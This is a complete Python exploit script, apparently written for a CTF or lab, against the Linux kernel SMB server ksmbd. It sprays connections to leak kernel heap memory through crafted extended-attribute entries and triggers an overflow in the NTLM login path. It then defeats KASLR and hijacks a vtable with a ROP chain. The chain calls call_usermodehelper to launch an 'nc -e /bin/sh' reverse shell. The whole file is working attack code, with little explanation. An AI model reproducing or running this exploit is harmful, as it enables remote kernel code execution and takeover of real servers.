from pwn import *
from itertools import accumulate
import threading
import sys
import os
import struct
import base64
import time

# 0x80 max connections, each stay alive forever on server side
'''
p server_conf
$5 = {
  flags = 0x0,
  state = 0x1,
  signing = 0x0,
  enforced_signing = 0x0,
  min_protocol = 0x2,
  max_protocol = 0x6,
  tcp_port = 0x1bd,
  ipc_timeout = 0x0,
  ipc_last_active = 0x0,
  deadtime = 0x0,
  share_fake_fscaps = 0x40,
  domain_sid = {
    revision = 0x1,
    num_subauth = 0x4,
    authority = "\000\000\000\000\000\005",
    sub_auth = {0x15, 0xa957530c, 0xba190f55, 0xb2a2432f, 0x0 <repeats 11 times>}
  },
  auth_mechs = 0x7,
  max_connections = 0x80,
  conf = {0xffff8881042b6940 "KSMBD SERVER", 0xffff8881042b60a0 "SMB SERVER", 0xffff8881042b6e10 "WORKGROUP"}
}
'''

def dump_x_gx(data):
    n = len(data)
    pad_len = (8 - (n % 8)) % 8
    padded = data + b"\x00" * pad_len

    for i in range(0, len(padded), 8):
        chunk = padded[i:i+8]
        real_len = min(8, n - i)

        if real_len == 8:
            val = struct.unpack("<Q", chunk)[0]
            print(f"0x{val:016x}")
        else:
            parts = [f"{b:02x}" for b in chunk[:real_len]]
            parts += ["XX"] * (8 - real_len)
            hex_str = "".join(parts[::-1])
            print("0x" + hex_str.replace("XX", "XXXXX", 1) 
                        if "XX" in parts else "0x" + hex_str)

def extract_qwords(data):
    n_full = len(data) // 8 * 8
    qwords = []
    for i in range(0, n_full, 8):
        chunk = data[i:i+8]
        val = struct.unpack("<Q", chunk)[0]
        qwords.append(val)
    return qwords

from impacket.smbconnection import SMBConnection
from impacket.smb3structs import *
from impacket.structure import Structure
import functools
import impacket.ntlm

ADDRESS = 'localhost'
TARGET_IP = '127.0.0.1'
PORT = 1337
USER = 'fossboss'
PW = 'fossboss'
DOMAIN = 'localhost'
SHARE = 'CompanyShare'
FILENAME = 'foo'

def conn():
    return SMBConnection(ADDRESS, TARGET_IP, sess_port=PORT, preferredDialect=SMB2_DIALECT_311, timeout=30000)

def open_file(conn, tid):
    return conn.create(
        tid,
        FILENAME,
        desiredAccess=FILE_READ_DATA | FILE_WRITE_DATA | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | FILE_READ_EA | FILE_WRITE_EA,
        shareMode=FILE_SHARE_READ | FILE_SHARE_WRITE,
        creationOptions=FILE_NON_DIRECTORY_FILE,
        creationDisposition=FILE_OVERWRITE_IF,
        fileAttributes=FILE_ATTRIBUTE_NORMAL
    )

leaker = conn()
leaker.login(USER, PW, DOMAIN)
leaker = leaker._SMBConnection
assert leaker.getDialect() == SMB2_DIALECT_311

# will leak -0x10 less
def make_evil(size):
    assert(size >= 0x20)
    # 12 bytes left till size after this
    evil_ea_name = b'evil.name' + b''.ljust(size - 12 - 9 + 1 - 12, b'A') + b'\x00\x00\x00'
    evil_value_name = p32(0) + p8(0) + p8(3) + p16(size - 0x10) + b'oof\x00'
    evil_entry = FILE_FULL_EA_INFORMATION()
    evil_entry['NextEntryOffset'] = size - 12
    evil_entry['Flags'] = 0
    evil_entry['EaNameLength'] = len(evil_ea_name) - 1
    evil_entry['EaValueLength'] = len(evil_value_name)
    evil_entry['EaName'] = evil_ea_name
    evil_entry['EaValue'] = evil_value_name
    return evil_entry

def deserialize_ea(info):
    namelen = info[5]
    valuelen = u16(info[6:8])
    name = info[8:8 + namelen]
    value = info[8 + namelen:]
    return (name, value)

def leak(leaker, tid, fid, amount):
    # can't arbitrarily leak because of this nonsensical check
    # https://elixir.bootlin.com/linux/v6.1.45/source/fs/smb/server/smb2pdu.c#L2343
    entries = [make_evil(amount-0x65)]
    entries = [e.getData() for e in entries]
    leaker.setInfo(
        tid,
        fid,
        inputBlob=b''.join(entries),
        infoType=SMB2_0_INFO_FILE,
        fileInfoClass=SMB2_FULL_EA_INFO
    )

    result = leaker.queryInfo(
        tid,
        fid,
        fileInfoClass=SMB2_FULL_EA_INFO
    )

    _, leak = deserialize_ea(result)
    leak = leak[2:]
    dump_x_gx(leak)
    return leak

spray1 = 0x18
spray2 = spray1 + 0x10
spray3 = spray2 + 0x18
spray4 = spray3 + 0x18
conns = [None for i in range(spray4)]
kmalloc512_leak = None
kmalloc512_leak_q = None
kmalloc1k_leak = None
kmalloc1k_leak_q = None
target_conn = None

tid = leaker.connectTree(SHARE)
fid = open_file(leaker, tid)
while True:
    for i in range(spray1):
        log.info(f"spraying conn {i}")
        # struct ksmbd_conn alloc
        conns[i] = conn()
        # struct ksmbd_session alloc
        conns[i]._SMBConnection.login_init(USER, PW, DOMAIN)

    # spray and retry, because of slab noise and slab randomization
    # a bigger kmalloc-1024?, then kmalloc-512, potentially a few other allocs
    log.info('leakage of kmalloc-512')
    kmalloc512_leak = leak(leaker, tid, fid, 0x200)
    kmalloc512_leak_q = extract_qwords(kmalloc512_leak)
    if kmalloc512_leak_q[2] != 0x4343434343434343:
        log.info('leak failed, trying again')
        for i in range(spray1):
            conns[i]._SMBConnection.close_session()
        fid = open_file(leaker, tid)
    else:
        break

overflowed_conn = None
failed_evils = []
while True:
    evil = conn()
    for i in range(spray1, spray2):
        log.info(f"spraying conn {i}")
        conns[i] = conn()
        conns[i]._SMBConnection.login_init(USER, PW, DOMAIN)

    log.info(f"allocate evil")
    # ksmbd_session allocate
    evil._SMBConnection.login_init(USER, PW, DOMAIN)

    for i in range(spray2, spray3):
        log.info(f"spraying conn {i}")
        conns[i] = conn()
        conns[i]._SMBConnection.login_init(USER, PW, DOMAIN)

    for i in range(spray1, spray3):
        conns[i]._SMBConnection.login_finish()

    # set a potential state as in progress to see if any error
    payload = (b'Z' * 40 + (kmalloc512_leak[0x68:]).ljust(0x200 - 0x68, b'Z') + 
                kmalloc512_leak[:0x34]) + p32(1) 
    os.environ['IMPACKET_OVERFLOW_NTLM'] = base64.b64encode(payload).decode()
    # note when logging in, a kmalloc-512 allocation is made and then freed for storing cipher stuff
    evil._SMBConnection.login_finish()
    os.environ.pop("IMPACKET_OVERFLOW_NTLM", None)

    for i in range(spray1, spray3):
        try:
            log.info(f'attempting tree connect on {i}')
            conns[i]._SMBConnection.connectTree(SHARE)
        except impacket.smb3.SessionError:
            overflowed_conn = i
            log.info(f'overflowed connection: {overflowed_conn}')
            break

    if overflowed_conn is None:
        # note that we are limited in total attempts in this
        # but we should be able to hit in a few tries at most
        log.info('overflow failed, retrying')
        for i in range(spray1, spray3):
            conns[i]._SMBConnection.close_session()
        failed_evils.append(evil)
    else:
        break

while True:
    for i in range(spray3, spray4):
        log.info(f"spraying conn {i}")
        conns[i] = conn()
        conns[i]._SMBConnection.login_init(USER, PW, DOMAIN)
    # a bigger kmalloc-2048?, then kmalloc-1024, potentially a few other allocs
    log.info('leakage of kmalloc-1024')
    kmalloc1k_leak = leak(leaker, tid, fid, 0x400)
    kmalloc1k_leak_q = extract_qwords(kmalloc1k_leak)
    if kmalloc1k_leak_q[0] & 0xffff == 0xdd00:
        guid = (p64(kmalloc1k_leak_q[35]) + p64(kmalloc1k_leak_q[36])).decode()
        print(f'guid is: {guid}')
        for i in range(spray4):
            if guid == conns[i]._SMBConnection.ClientGuid:
                target_conn = i
                log.info(f'found target conn based on guid at {target_conn}')
        if target_conn != None:
            break

    log.info('failed, trying again')
    for i in range(spray3, spray4):
        conns[i]._SMBConnection.close_session()
    fid = open_file(leaker, tid)

target = kmalloc1k_leak_q[6] - 0x30 - 0x1c0

smb311_server_values = kmalloc1k_leak_q[0]
kaslr_base = smb311_server_values - (0xffffffff82fcdd00 - 0xffffffff81000000)
rebase = lambda orig_addr : kaslr_base + (orig_addr - 0xffffffff81000000)
# 0xffffffff810f4533: leave ; ret ;
leave_ret = rebase(0xffffffff810f4533)
# 0xffffffff81031157: pop rdi ; ret ;
pop_rdi = rebase(0xffffffff81031157)
# 0xffffffff8105c524: pop rsi ; ret ; 
pop_rsi = rebase(0xffffffff8105c524)
# 0xffffffff810aac72: pop rdx ; ret ;
pop_rdx = rebase(0xffffffff810aac72)
# 0xffffffff81245e83: pop rcx ; ret ;
pop_rcx = rebase(0xffffffff81245e83)
# 0xffffffff811eaf20: pop rsp ; ret ;
pop_rsp = rebase(0xffffffff811eaf20)
'''
x/50gx 0xffffffff82e5ee00
0xffffffff82e5ee00 <envp.0>:    0xffffffff827e612a  0xffffffff827e6131
0xffffffff82e5ee10 <envp.0+16>: 0xffffffff82843918  0x0000000000000000
'''
envp = rebase(0xffffffff82e5ee00)
call_usermodehelper = rebase(0xffffffff810e9e40)
msleep = rebase(0xffffffff8115ffc0)

log.info(f'kaslr: {hex(kaslr_base)}')
log.info(f'stack pivot: {hex(leave_ret)}')
log.info(f'pop rdi: {hex(pop_rdi)}')
log.info(f'pop rsi: {hex(pop_rsi)}')
log.info(f'pop rdx: {hex(pop_rdx)}')
log.info(f'pop rcx: {hex(pop_rcx)}')
log.info(f'pop_rsp: {hex(pop_rsp)}')
log.info(f'envp: {hex(envp)}')
log.info(f'call_usermodehelper: {hex(call_usermodehelper)}')
log.info(f'msleep: {hex(msleep)}')
log.info(f'choosing our target: {hex(target)}')

payload = (b'Z' * 40 + (kmalloc512_leak[0x68:]).ljust(0x200 - 0x68, b'Z') + p64(0xbaad) + p16(0x311) + b'X' * 16 +
            kmalloc512_leak[0x8+18:0x38] + p64(target))
os.environ['IMPACKET_OVERFLOW_NTLM'] = base64.b64encode(payload).decode()
# note when logging in, a kmalloc-512 allocation is made and then freed for storing cipher stuff
evil._SMBConnection.login_finish()
os.environ.pop("IMPACKET_OVERFLOW_NTLM", None)

payload_size = 0x1c0-0x64
# control rbp, rcx, r8, controlled data around 0xffff888102d97a40
'''
[  209.080442] RAX: 1337babebaadbeef RBX: 0000000000000000 RCX: ffff888102d97b00
[  209.084157] RDX: 0000000000000006 RSI: ffffc90000043db2 RDI: 0000000000000066
[  209.087849] RBP: ffff888102d97b00 R08: ffff888102d97c00 R09: 0000000000000052
[  209.091570] R10: 000000000000000a R11: d9b8d6dba644bded R12: ffff888102f70052
[  209.095254] R13: 0000000000000008 R14: 0000000000000010 R15: 0000000000000000
'''
# grep --color=always -A10 -E ",QWORD PTR \[(rbp|rcx)" disas | grep -B10 "indirect_thunk"
cmd_base = target + 0x168
cmd = [b'/usr/bin/nc.traditional\x00', b'-e\x00', b'/bin/sh\x00', b'127.0.0.1\x00', b'1337\x00']
cmd_argv = b''.join(
    map(p64, (cmd_base + offset for offset in accumulate([0] + [len(x) for x in cmd[:-1]])))
)
evil_nls = (p64(0x4141414141414141) + p64(pop_rdi) +
                p64(leave_ret) + 
                p64(pop_rdi) + p64(cmd_base) + 
                p64(pop_rsi) + p64(target + 0x138) +
                p64(pop_rdx) + p64(envp) +
                p64(pop_rcx) + p64(0) +
                p64(call_usermodehelper) + 
                p64(pop_rdi) + p64(0x7fffffff) +
                p64(msleep) + 
                cmd_argv + p64(0x0) +
                b''.join(c for c in cmd))
payload = (b'\x68' * (0x4+8*11) + evil_nls.ljust(0x1c0-0x68-8*11, b'\x68') + 
                kmalloc1k_leak[:0x58] + p64(target+0xc0) + kmalloc1k_leak[0x60:0x238-0x70])
log.info(f'payload len: {hex(len(payload))}')
log.info('triggering arb free')
# free preauth_hash with authentication path
conns[overflowed_conn]._SMBConnection.login_finish()
try:
    leaker.setInfo(
        tid,
        fid,
        inputBlob=payload,
        infoType=SMB2_0_INFO_FILE,
        fileInfoClass=SMB2_FULL_EA_INFO
    )
except:
    pass

log.info('vtable should be hijacked')
conns[target_conn]._SMBConnection.login_finish()

input('ending connections will probably crash the system')
